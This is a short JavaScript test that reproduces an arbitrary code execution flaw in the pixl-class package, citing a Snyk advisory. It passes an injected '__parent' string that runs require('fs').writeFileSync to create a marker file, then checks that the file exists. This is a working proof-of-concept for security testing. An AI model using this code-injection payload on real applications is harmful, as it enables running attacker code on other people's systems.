//https://security.snyk.io/vuln/SNYK-JS-PIXLCLASS-564968
test("Arbitrary code execution in pixl-class", () => {
  const fs = require("fs");
  const a = require("pixl-class");
  const path = "./pixl-class";

  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  var members = {
    __parent:
      'function(){}; require("fs").writeFileSync("./pixl-class",""); //}',
  };

  // var members = {
  //   __parent:'function(){}; console.log(123)//}'
  // }

  try {
    a.create(members);
  } catch (e) {
    // console.error(e);
  }

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
